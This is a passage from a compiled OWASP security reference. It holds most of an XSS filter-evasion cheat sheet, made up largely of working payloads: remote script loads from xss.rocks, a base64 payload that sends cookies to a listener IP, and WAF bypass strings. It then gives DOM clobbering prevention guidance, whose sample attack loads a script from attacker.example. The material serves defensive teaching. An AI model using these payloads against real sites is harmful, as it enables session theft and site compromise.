- `onResizeEnd()` (user would resize the window; attacker could auto initialize with something like: `<SCRIPT>self.resizeTo(500,400);</SCRIPT>`)
- `onResizeStart()` (user would resize the window; attacker could auto initialize with something like: `<SCRIPT>self.resizeTo(500,400);</SCRIPT>`)
- `onResume()` (the onresume event fires on every element that becomes active when the timeline resumes, including the body element)
- `onReverse()` (if the element has a repeatCount greater than one, this event fires every time the timeline begins to play backward)
- `onRowsEnter()` (user or attacker would need to change a row in a data source)
- `onRowExit()` (user or attacker would need to change a row in a data source)
- `onRowDelete()` (user or attacker would need to delete a row in a data source)
- `onRowInserted()` (user or attacker would need to insert a row in a data source)
- `onScroll()` (user would need to scroll, or attacker could use the `scrollBy()` function)
- `onSeek()` (the `onReverse` event fires when the timeline is set to play in any direction other than forward)
- `onSelect()` (user needs to select some text - attacker could auto initialize with something like: `window.document.execCommand("SelectAll");`)
- `onSelectionChange()` (user needs to select some text - attacker could auto initialize with something like: `window.document.execCommand("SelectAll");`)
- `onSelectStart()` (user needs to select some text - attacker could auto initialize with something like: `window.document.execCommand("SelectAll");`)
- `onStart()` (fires at the beginning of each marquee loop)
- `onStop()` (user would need to press the stop button or leave the webpage)
- `onStorage()` (storage area changed)
- `onSyncRestored()` (user interrupts the element's ability to play its media as defined by the timeline to fire)
- `onSubmit()` (requires attacker or user submits a form)
- `onTimeError()` (user or attacker sets a time property, such as dur, to an invalid value)
- `onTrackChange()` (user or attacker changes track in a playList)
- `onUndo()` (user went backward in undo transaction history)
- `onUnload()` (as the user clicks any link or presses the back button or attacker forces a click)
- `onURLFlip()` (this event fires when an Advanced Streaming Format (ASF) file, played by a HTML+TIME (Timed Interactive Multimedia Extensions) media tag, processes script commands embedded in the ASF file)
- `seekSegmentTime()` (this is a method that locates the specified point on the element's segment time line and begins playing from that point. The segment consists of one repetition of the time line including reverse play using the AUTOREVERSE attribute.)

##### BGSOUND

```js
<BGSOUND SRC="javascript:alert('XSS');">
```

##### & JavaScript includes

```html
<BR SIZE="&{alert('XSS')}">
```

##### STYLE sheet

```html
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
```

#### Remote style sheet

Using something as simple as a remote style sheet you can include your XSS as the style parameter can be redefined using an embedded expression. This only works in IE. Notice that there is nothing on the page to show that there is included JavaScript. Note: With all of these remote style sheet examples they use the body tag, so it won't work unless there is some content on the page other than the vector itself, so you'll need to add a single letter to the page to make it work if it's an otherwise blank page:

```html
<LINK REL="stylesheet" HREF="http://xss.rocks/xss.css">
```

##### Remote style sheet part 2

This works the same as above, but uses a `<STYLE>` tag instead of a `<LINK>` tag). A slight variation on this vector was used
to hack Google Desktop. As a side note, you can remove the end `</STYLE>` tag if there is HTML immediately after the vector to close it. This is useful if you cannot have either an equals sign or a slash in your cross site scripting attack, which has come up at least once in the real world:

```html
<STYLE>@import'http://xss.rocks/xss.css';</STYLE>
```

##### Remote style sheet part 3

This only works in Gecko rendering engines and works by binding an XUL file to the parent page.

```html
<STYLE>BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}</STYLE>
```

#### STYLE Tags that Breaks Up JavaScript for XSS

This XSS at times sends IE into an infinite loop of alerts:

```html
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
```

#### STYLE Attribute that Breaks Up an Expression

```html
<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
```

(Created by Roman Ivanov)

#### IMG STYLE with Expressions

This is really a hybrid of the last two XSS vectors, but it really does show how hard STYLE tags can be to parse apart. This can send IE into a loop:

```html
exp/*<A STYLE='no\xss:noxss("*//*");
xss:ex/*XSS*//*/*/pression(alert("XSS"))'>
```

#### STYLE Tag using Background-image

```html
<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
```

#### STYLE Tag using Background

```html
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
<STYLE type="text/css">BODY{background:url("<javascript:alert>('XSS')")}</STYLE>
```

#### Anonymous HTML with STYLE Attribute

The IE rendering engine doesn't really care if the HTML tag you build exists or not, as long as it starts with an open angle bracket and a letter:

```html
<XSS STYLE="xss:expression(alert('XSS'))">
```

#### Local htc File

This is a little different than the last two XSS vectors because it uses an .htc file that must be on the same server as the XSS vector. This example file works by pulling in the JavaScript and running it as part of the style attribute:

```html
<XSS STYLE="behavior: url(xss.htc);">
```

#### US-ASCII Encoding

This attack uses malformed ASCII encoding with 7 bits instead of 8. This XSS method may bypass many content filters but it only works if the host transmits in US-ASCII encoding or if you set the encoding yourself. This is more useful against web application firewall (WAF) XSS evasion than it is server side filter evasion. Apache Tomcat is the only known server that by default still transmits in US-ASCII encoding.

```js
¼script¾alert(¢XSS¢)¼/script¾
```

#### META

The odd thing about meta refresh is that it doesn't send a referrer in the header - so it can be used for certain types of attacks where you need to get rid of referring URLs:

```html
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
```

##### META using Data

Directive URL scheme. This attack method is nice because it also doesn't have anything visible that has the word SCRIPT or the JavaScript directive in it, because it utilizes base64 encoding. Please see [RFC 2397](https://datatracker.ietf.org/doc/html/rfc2397) for more details.

```html
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
```

##### META with Additional URL Parameter

If the target website attempts to see if the URL contains `<http://>;` at the beginning you can evade this filter rule with the following technique:

```html
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
```

(Submitted by Moritz Naumann)

#### IFRAME

If iFrames are allowed there are a lot of other XSS problems as well:

```html
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
```

#### IFRAME Event Based

IFrames and most other elements can use event based mayhem like the following:

```html
<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
```

(Submitted by: David Cross)

#### FRAME

Frames have the same sorts of XSS problems as iFrames

```html
<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
```

#### TABLE

```html
<TABLE BACKGROUND="javascript:alert('XSS')">
```

##### TD

Just like above, TD's are vulnerable to BACKGROUNDs containing JavaScript XSS vectors:

```html
<TABLE><TD BACKGROUND="javascript:alert('XSS')">
```

#### DIV

##### DIV Background-image

```html
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
```

##### DIV Background-image with Unicode XSS Exploit

This has been modified slightly to obfuscate the URL parameter:

```html
<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
```

(Original vulnerability was found by Renaud Lifchitz as a vulnerability in Hotmail)

##### DIV Background-image Plus Extra Characters

RSnake built a quick XSS fuzzer to detect any erroneous characters that are allowed after the open parenthesis but before the JavaScript directive in IE. These are in decimal but you can include hex and add padding of course. (Any of the following chars can be used: 1-32, 34, 39, 160, 8192-8.13, 12288, 65279):

```html
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
```

##### DIV Expression

A variant of this attack was effective against a real-world XSS filter by using a newline between the colon and `expression`:

```html
<DIV STYLE="width: expression(alert('XSS'));">
```

#### Downlevel-Hidden Block

Only works on the IE rendering engine - Trident. Some websites consider anything inside a comment block to be safe and therefore does not need to be removed, which allows our XSS vector to exist. Or the system might try to add comment tags around something in a vain attempt to render it harmless. As we can see, that probably wouldn't do the job:

```js
<!--[if gte IE 4]>
<SCRIPT>alert('XSS');</SCRIPT>
<![endif]-->
```

#### BASE Tag

(Works on IE in safe mode) This attack needs the `//` to comment out the next characters so you won't get a JavaScript error and your XSS tag will render. Also, this relies on the fact that many websites uses dynamically placed images like `images/image.jpg` rather than full paths. If the path includes a leading forward slash like `/images/image.jpg`, you can remove one slash from this vector (as long as there are two to begin the comment this will work):

```html
<BASE HREF="javascript:alert('XSS');//">
```

#### OBJECT Tag

If the system allows objects, you can also inject virus payloads that can infect the users, etc with the APPLET tag. The linked file is actually an HTML file that can contain your XSS:

```html
<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>
```

#### EMBED SVG Which Contains XSS Vector

This attack only works in Firefox:

```html
<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
```

(Thanks to nEUrOO for this one)

#### XML Data Island with CDATA Obfuscation

This XSS attack works only in IE:

```html
<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert('XSS')"></B></I></XML>
<SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
```

#### Locally hosted XML with embedded JavaScript that is generated using an XML data island

This attack is nearly the same as above, but instead it refers to a locally hosted (on the same server) XML file that will hold your XSS vector. You can see the result here:

```html
<XML SRC="xsstest.xml" ID=I></XML>
<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
```

#### HTML+TIME in XML

This attack only works in IE and remember that you need to be between HTML and BODY tags for this to work:

```html
<HTML><BODY>
<?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">
<?import namespace="t" implementation="#default#time2">
<t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert("XSS")</SCRIPT>">
</BODY></HTML>
```

<!-- textlint-disable terminology -->
(This is how Grey Magic hacked Hotmail and Yahoo!)
<!-- textlint-enable terminology -->

#### Assuming you can only fit in a few characters and it filters against `.js`

This attack allows you to rename your JavaScript file to an image as an XSS vector:

```html
<SCRIPT SRC="http://xss.rocks/xss.jpg"></SCRIPT>
```

#### SSI (Server Side Includes)

This requires SSI to be installed on the server to use this XSS vector. I probably don't need to mention this, but if you can run commands on the server there are no doubt much more serious issues:

```js
<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://xss.rocks/xss.js></SCRIPT>'"-->
```

#### PHP

This attack requires PHP to be installed on the server. Again, if you can run any scripts remotely like this, there are probably much more dire issues:

```php
<? echo('<SCR)';
echo('IPT>alert("XSS")</SCRIPT>'); ?>
```

#### IMG Embedded Commands

This attack only works when this is injected (like a web-board) in a web page behind password protection and that password protection works with other commands on the same domain. This can be used to delete users, add users (if the user who visits the page is an administrator), send credentials elsewhere, etc. This is one of the lesser used but more useful XSS vectors:

```html
<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
```

##### IMG Embedded Commands part II

This is more scary because there are absolutely no identifiers that make it look suspicious other than it is not hosted on your own domain. The vector uses a 302 or 304 (others work too) to redirect the image back to a command. So a normal `<IMG SRC="httx://badguy.com/a.jpg">` could actually be an attack vector to run commands as the user who views the image link. Here is the `.htaccess` (under Apache) line to accomplish the vector:

```log
Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
```

(Thanks to Timo for part of this)

#### Cookie Manipulation

This method is pretty obscure but there are a few examples where `<META` is allowed and it can be used to overwrite cookies. There are other examples of sites where instead of fetching the username from a database it is stored inside of a cookie to be displayed only to the user who visits the page. With these two scenarios combined you can modify the victim's cookie which will be displayed back to them as JavaScript (you can also use this to log people out or change their user states, get them to log in as you, etc):

```html
<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
```

#### XSS Using HTML Quote Encapsulation

This attack was originally tested in IE so your mileage may vary. For performing XSS on sites that allow `<SCRIPT>` but don't allow `<SCRIPT SRC...` by way of a regex filter `/\<script\[^\>\]+src/i`, do the following:

```html
<SCRIPT a=">" SRC="httx://xss.rocks/xss.js"></SCRIPT>
```

If you are performing XSS on sites that allow `<SCRIPT>` but don't allow `\<script src...` due to a regex filter that does `/\<script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\>\\s\]+))?)+\\s\*|\\s\*)src/i` (This is an important one, because this regex has been seen in the wild):

```html
<SCRIPT =">" SRC="httx://xss.rocks/xss.js"></SCRIPT>
```

Another XSS to evade the same filter: `/\<script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\>\\s\]+))?)+\\s\*|\\s\*)src/i`:

```html
<SCRIPT a=">" '' SRC="httx://xss.rocks/xss.js"></SCRIPT>
```

Yet another XSS that evades the same filter: `/\<script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\>\\s\]+))?)+\\s\*|\\s\*)src/i`

Generally, we are not discussing mitigation techniques, but the only thing that stops this XSS example is, if you still want to allow `<SCRIPT>` tags but not remote script is a state machine (and of course there are other ways to get around this if they allow `<SCRIPT>` tags), use this:

```html
<SCRIPT "a='>'" SRC="httx://xss.rocks/xss.js"></SCRIPT>
```

And one last XSS attack to evade, `/\<script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\>\\s\]+))?)+\\s\*|\\s\*)src/i` using grave accents (again, doesn't work in Firefox):

<!-- markdownlint-disable MD038-->
```html
<SCRIPT a=`>` SRC="httx://xss.rocks/xss.js"></SCRIPT>
```
<!-- markdownlint-enable MD038-->

Here's an XSS example which works if the regex won't catch a matching pair of quotes but instead will find any quotes to terminate a parameter string improperly:

```html
<SCRIPT a=">'>" SRC="httx://xss.rocks/xss.js"></SCRIPT>
```

This XSS still worries me, as it would be nearly impossible to stop this without blocking all active content:

```html
<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="httx://xss.rocks/xss.js"></SCRIPT>
```

#### URL String Evasion

The following attacks work if `http://www.google.com/` is programmatically disallowed:

##### IP Versus Hostname

```html
<A HREF="http://66.102.7.147/">XSS</A>
```

##### URL Encoding

```html
<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
```

##### DWORD Encoding

Note: there are other of variations of DWORD encoding - see the IP Obfuscation calculator below for more details:

```html
<A HREF="http://1113982867/">XSS</A>
```

##### Hex Encoding

The total size of each number allowed is somewhere in the neighborhood of 240 total characters as you can see on the second digit, and since the hex number is between 0 and F the leading zero on the third hex quote is not required:

```html
<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
```

##### Octal Encoding

Again padding is allowed, although you must keep it above 4 total characters per class - as in class A, class B, etc:

```html
<A HREF="http://0102.0146.0007.00000223/">XSS</A>
```

##### Base64 Encoding

```html
<img onload="eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU='))">
```

##### Mixed Encoding

Let's mix and match base encoding and throw in some tabs and newlines (why browsers allow this, I'll never know). The tabs and newlines only work if this is encapsulated with quotes:

<!-- markdownlint-disable MD010-->
```html
<A HREF="h
tt  p://6	6.000146.0x7.147/">XSS</A>
```
<!-- markdownlint-enable MD010-->

##### Protocol Resolution Bypass

`//` translates to `http://`, which saves a few more bytes. This is really handy when space is an issue too (two less characters can go a long way) and can easily bypass regex like `(ht|f)tp(s)?://` (thanks to Ozh for part of this one). You can also change the `//` to `\\\\`. You do need to keep the slashes in place, however, otherwise this will be interpreted as a relative path URL:

```html
<A HREF="//www.google.com/">XSS</A>
```

##### Removing CNAMEs

When combined with the above URL, removing `www.` will save an additional 4 bytes for a total byte savings of 9 for servers that have set this up properly:

```html
<A HREF="http://google.com/">XSS</A>
```

Extra dot for absolute DNS:

```html
<A HREF="http://www.google.com./">XSS</A>
```

##### JavaScript Link Location

```html
<A HREF="javascript:document.location='http://www.google.com/'">XSS</A>
```

##### Content Replace as Attack Vector

<!-- markdownlint-disable MD010-->
Assuming `http://www.google.com/` is programmatically replaced with nothing. A similar attack vector has been used against several separate real world XSS filters by using the conversion filter itself (here is an example) to help create the attack vector `java&\#x09;script:` was converted into `java	script:`, which renders in IE:
<!-- markdownlint-enable MD010-->

```html
<A HREF="http://www.google.com/ogle.com/">XSS</A>
```

#### Assisting XSS with HTTP Parameter Pollution

If a content sharing flow on a web site is implemented as shown below, this attack will work. There is a `Content` page which includes some content provided by users and this page also includes a link to `Share` page which enables a user choose their favorite social sharing platform to share it on. Developers HTML encoded the `title` parameter in the `Content` page to prevent against XSS but for some reasons they didn't URL encoded this parameter to prevent from HTTP Parameter Pollution. Finally they decide that since `content_type`'s value is a constant and will always be integer, they didn't encode or validate the `content_type` in the `Share` page.

##### Content Page Source Code

```html
a href="/Share?content_type=1&title=<%=Encode.forHtmlAttribute(untrusted content title)%>">Share</a>
```

##### Share Page Source Code

```js
<script>
var contentType = <%=Request.getParameter("content_type")%>;
var title = "<%=Encode.forJavaScript(request.getParameter("title"))%>";
...
//some user agreement and sending to server logic might be here
...
</script>
```

##### Content Page Output

If attacker set the untrusted content title as `This is a regular title&content_type=1;alert(1)` the link in `Content` page would be this:

```html
<a href="/share?content_type=1&title=This is a regular title&amp;content_type=1;alert(1)">Share</a>
```

##### Share Page Output

And in share page output could be this:

```js
<script>
var contentType = 1; alert(1);
var title = "This is a regular title";
…
//some user agreement and sending to server logic might be here
…
</script>
```

As a result, in this example the main flaw is trusting the content_type in the `Share` page without proper encoding or validation. HTTP Parameter Pollution could increase impact of the XSS flaw by promoting it from a reflected XSS to a stored XSS.

### Character Escape Sequences

Here are all the possible combinations of the character `\<` in HTML and JavaScript. Most of these won't render out of the box, but many of them can get rendered in certain circumstances as seen above.

- `<`
- `%3C`
- `&lt`
- `&lt;`
- `&LT`
- `&LT;`
- `&#60`
- `&#060`
- `&#0060`
- `&#00060`
- `&#000060`
- `&#0000060`
- `&#60;`
- `&#060;`
- `&#0060;`
- `&#00060;`
- `&#000060;`
- `&#0000060;`
- `&#x3c`
- `&#x03c`
- `&#x003c`
- `&#x0003c`
- `&#x00003c`
- `&#x000003c`
- `&#x3c;`
- `&#x03c;`
- `&#x003c;`
- `&#x0003c;`
- `&#x00003c;`
- `&#x000003c;`
- `&#X3c`
- `&#X03c`
- `&#X003c`
- `&#X0003c`
- `&#X00003c`
- `&#X000003c`
- `&#X3c;`
- `&#X03c;`
- `&#X003c;`
- `&#X0003c;`
- `&#X00003c;`
- `&#X000003c;`
- `&#x3C`
- `&#x03C`
- `&#x003C`
- `&#x0003C`
- `&#x00003C`
- `&#x000003C`
- `&#x3C;`
- `&#x03C;`
- `&#x003C;`
- `&#x0003C;`
- `&#x00003C;`
- `&#x000003C;`
- `&#X3C`
- `&#X03C`
- `&#X003C`
- `&#X0003C`
- `&#X00003C`
- `&#X000003C`
- `&#X3C;`
- `&#X03C;`
- `&#X003C;`
- `&#X0003C;`
- `&#X00003C;`
- `&#X000003C;`
- `\x3c`
- `\x3C`
- `\u003c`
- `\u003C`

### Methods to Bypass WAF – Cross-Site Scripting

#### General issues

##### Stored XSS

If an attacker managed to push XSS through the filter, WAF wouldn’t be able to prevent the attack conduction.

##### Reflected XSS in JavaScript

Example:

```js
<script> ... setTimeout(\\"writetitle()\\",$\_GET\[xss\]) ... </script>
```

Exploitation:

```js
/?xss=500); alert(document.cookie);//
```

##### DOM-based XSS

Example:

```js
<script> ... eval($\_GET\[xss\]); ... </script>
```

Exploitation:

```js
/?xss=document.cookie
```

##### XSS via request Redirection

Vulnerable code:

```js
...
header('Location: '.$_GET['param']);
...
```

As well as:

```js
...
header('Refresh: 0; URL='.$_GET['param']);
...
```

This request will not pass through the WAF:

```html
/?param=<javascript:alert(document.cookie>)
```

This request will pass through the WAF and an XSS attack will be conducted in certain browsers:

```html
/?param=<data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
```

#### WAF ByPass Strings for XSS

<!-- markdownlint-disable MD038-->
- `<Img src = x onerror = "javascript: window.onerror = alert; throw XSS">`
- `<Video> <source onerror = "javascript: alert (XSS)">`
- `<Input value = "XSS" type = text>`
- `<applet code="javascript:confirm(document.cookie);">`
- `<isindex x="javascript:" onmouseover="alert(XSS)">`
- `"></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>`
- `"><img src="x:x" onerror="alert(XSS)">`
- `"><iframe src="javascript:alert(XSS)">`
- `<object data="javascript:alert(XSS)">`
- `<isindex type=image src=1 onerror=alert(XSS)>`
- `<img src=x:alert(alt) onerror=eval(src) alt=0>`
- `<img  src="x:gif" onerror="window['al\u0065rt'](https://cheatsheetseries.owasp.org/cheatsheets/0)"></img>`
- `<iframe/src="data:text/html,<svg onload=alert(1)>">`
- `<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>`

```html
<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script
```

- `<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">`
- `<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>`
- `<form><a href="javascript:\u0061lert(1)">X`
- `</script><img/*%00/src="worksinchrome&colon;prompt(1)"/%00*/onerror='eval(src)'>`
- `<style>//*{x:expression(alert(/xss/))}//<style></style>`

 On Mouse Over​:

- `<img src="/" =_=" title="onerror='prompt(1)'">`
- `<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickMe`

```html
<script x> alert(1) </script 1=2
```

- `<form><button formaction=javascript&colon;alert(1)>CLICKME`
- `<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"`
- `<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>`
- `<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT> `
<!-- markdownlint-enable MD038-->

#### Filter Bypass Alert Obfuscation

- `(alert)(1)`
- `a=alert,a(1)`
- `[1].find(alert)`
- `top[“al”+”ert”](https://cheatsheetseries.owasp.org/cheatsheets/1)`
- `top[/al/.source+/ert/.source](https://cheatsheetseries.owasp.org/cheatsheets/1)`
- `al\u0065rt(1)`
- `top[‘al\145rt’](https://cheatsheetseries.owasp.org/cheatsheets/1)`
- `top[‘al\x65rt’](https://cheatsheetseries.owasp.org/cheatsheets/1)`
- `top[8680439..toString(30)](https://cheatsheetseries.owasp.org/cheatsheets/1)`
- `alert?.()`
- `(alert())`

The payload should include leading and trailing backticks:

```js
&#96;`${alert``}`&#96;
```

## DOM Clobbering Prevention

> **Source:** [DOM Clobbering Prevention](https://cheatsheetseries.owasp.org/cheatsheets/DOM_Clobbering_Prevention_Cheat_Sheet.html) · [OWASP Cheat Sheet Series](https://github.com/OWASP/CheatSheetSeries), CC BY-SA 4.0

### Introduction

[DOM Clobbering](https://domclob.xyz/domc_wiki/#overview) is a type of code-reuse, HTML-only injection attack, where attackers confuse a web application by injecting HTML elements whose `id` or `name` attribute matches the name of security-sensitive variables or browser APIs, such as variables used for fetching remote content (e.g., script src), and overshadow their value.

It is particularly relevant when script injection is not possible, e.g., when filtered by HTML sanitizers, or mitigated by disallowing or controlling script execution. In these scenarios, attackers may still inject non-script HTML markups into webpages and transform the initially secure markup into executable code, achieving [Cross-Site Scripting (XSS)](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).

**This cheat sheet is a list of guidelines, secure coding patterns, and practices to prevent or restrict the impact of DOM Clobbering in your web application.**

### Background

Before we dive into DOM Clobbering, let's refresh our knowledge with some basic Web background.

When a webpage is loaded, the browser creates a [DOM tree](https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model/Introduction) that represents the structure and content of the page, and JavaScript code has read and write access to this tree.

When creating the DOM tree, browsers also create an attribute for (some) named HTML elements on `window` and `document` objects. Named HTML elements are those having an `id` or `name` attribute. For example, the markup:

```html
<form id=x name=x></form>
```

creates named references to the form on `window` and `document`. The `name` attribute is needed for [named access on `document`](https://html.spec.whatwg.org/multipage/dom.html#dom-document-nameditem); a form's `id` alone does not provide that reference:

```js
var obj1 = document.getElementById('x');
var obj2 = document.x;
var obj3 = document.x;
var obj4 = window.x;
var obj5 = x; // by default, objects belong to the global Window, so x is same as window.x
console.log(
 obj1 === obj2 && obj2 === obj3 &&
 obj3 === obj4 && obj4 === obj5
); // true
```

When accessing an attribute of `window` and `document` objects, named HTML element references come before lookups of built-in APIs and other attributes on `window` and `document` that developers have defined, also known as [named property accesses](https://html.spec.whatwg.org/multipage/nav-history-apis.html#named-access-on-the-window-object). Developers unaware of such behavior may use the content of window/document attributes for sensitive operations, such as URLs for fetching remote content, and attackers can exploit it by injecting markups with colliding names. Similarly to custom attributes/variables, built-in browser APIs may be overshadowed by DOM Clobbering.

If attackers are able to inject (non-script) HTML markup in the DOM tree,
it can change the value of a variable that the web application relies on due to named property accesses, causing it to malfunction, expose sensitive data, or execute attacker-controlled scripts. DOM Clobbering works by taking advantage of this (legacy) behavior, causing a namespace collision between the execution environment (i.e., `window` and `document` objects), and JavaScript code.

#### Example Attack 1

```javascript
let redirectTo = window.redirectTo || '/profile/';
location.assign(redirectTo);
```

The attacker can:

- inject the markup `<a id=redirectTo href='javascript:alert(1)'></a>` and obtain XSS.
- inject the markup `<a id=redirectTo href='https://phishing.example/'></a>` and obtain open redirect.

#### Example Attack 2

```javascript
var script = document.createElement('script');
let src = window.config.url || 'script.js';
script.src = src;
document.body.appendChild(script);
```

The attacker can inject the markup `<a id=config></a><a id=config name=url href='https://attacker.example/payload.js'></a>` to load additional JavaScript code, and obtain arbitrary client-side code execution.

### Summary of Guidelines

For quick reference, below is the summary of guidelines discussed next.

|    | **Guidelines**                                                | Description                                                               |
|----|---------------------------------------------------------------|---------------------------------------------------------------------------|
| \# 1  | Use HTML Sanitizers                                           | [link](#1-html-sanitization)                                              |
| \# 2  | Use Content-Security Policy                                   | [link](#2-content-security-policy)                                        |
| \# 3  | Freeze Application Configuration Objects                                  | [link](#3-freezing-application-configuration-objects)                                 |
| \# 4  | Validate All Inputs to DOM Tree                               | [link](#4-validate-all-inputs-to-dom-tree)                                |
| \# 5  | Use Explicit Variable Declarations                            | [link](#5-use-explicit-variable-declarations)                             |
| \# 6  | Do Not Use Document and Window for Global Variables           | [link](#6-do-not-use-document-and-window-for-global-variables)            |
| \# 7  | Do Not Trust Document Built-in APIs Before Validation         | [link](#7-do-not-trust-document-built-in-apis-before-validation)          |
| \# 8  | Enforce Type Checking                                         | [link](#8-enforce-type-checking)                                          |
| \# 9  | Use Strict Mode                                               | [link](#9-use-strict-mode)                                                |
| \# 10 | Apply Browser Feature Detection                               | [link](#10-apply-browser-feature-detection)                               |
| \# 11 | Limit Variables to Local Scope                                | [link](#11-limit-variables-to-local-scope)                                |
| \# 12 | Use Unique Variable Names In Production                       | [link](#12-use-unique-variable-names-in-production)                       |
| \# 13 | Use Object-oriented Programming Techniques like Encapsulation | [link](#13-use-object-oriented-programming-techniques-like-encapsulation) |

### Mitigation Techniques

#### \#1: HTML Sanitization

Robust HTML sanitizers can prevent or restrict the risk of DOM Clobbering. They can do so in multiple ways. For example:

- completely remove named properties like `id` and `name`. While effective, this may hinder the usability when named properties are needed for legitimate functionalities.
- namespace isolation, which can be, for example, prefixing the value of named properties by a constant string to limit the risk of naming collisions.
- dynamically checking if named properties of the input mark has collisions with the existing DOM tree, and if that is the case, then remove named properties of the input markup.

OWASP recommends [DOMPurify](https://github.com/cure53/DOMPurify) or the [Sanitizer API](https://developer.mozilla.org/en-US/docs/Web/API/HTML_Sanitizer_API) for HTML sanitization.

##### DOMPurify Sanitizer

By default, DOMPurify removes all clobbering collisions with **built-in** APIs and properties (using the enabled-by-default `SANITIZE_DOM` configuration option).

To be protected against clobbering of custom variables and properties as well, you need to enable the `SANITIZE_NAMED_PROPS` config:

```js
var clean = DOMPurify.sanitize(dirty, {SANITIZE_NAMED_PROPS: true});
```

This would isolate the namespace of named properties and JavaScript variables by prefixing them with `user-content-` string.

##### Sanitizer API

Use the browser's [Sanitizer API](https://developer.mozilla.org/en-US/docs/Web/API/Sanitizer/Sanitizer) only where the required methods are supported. Start with its default configuration and explicitly disallow `id` and `name` using [`removeAttribute()`](https://developer.mozilla.org/en-US/docs/Web/API/Sanitizer/removeAttribute), which removes the attribute from all elements:

```js
const sanitizerInstance = new Sanitizer();
sanitizerInstance.removeAttribute('id');
sanitizerInstance.removeAttribute('name');
containerDOMElement.setHTML(input, {sanitizer: sanitizerInstance});
```

This example assumes the application does not need `id` or `name` attributes in the untrusted markup. In unsupported browsers, use the DOMPurify configuration above; do not fall back to inserting unsanitized HTML.

#### \#2: Content-Security Policy

[Content-Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy) is a set of rules that tell the browser which resources are allowed to be loaded on a web page. By restricting the sources of JavaScript files (e.g., with the [script-src](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src) directive), CSP can prevent malicious code from being injected into the page.

**Note:** CSP can only mitigate **some variants** of DOM clobbering attacks, such as when attackers attempt to load new scripts by clobbering script sources, but not when already-present code can be abused for code execution, e.g., clobbering the parameters of code evaluation constructs like `eval()`.

#### \#3: Freezing Application Configuration Objects

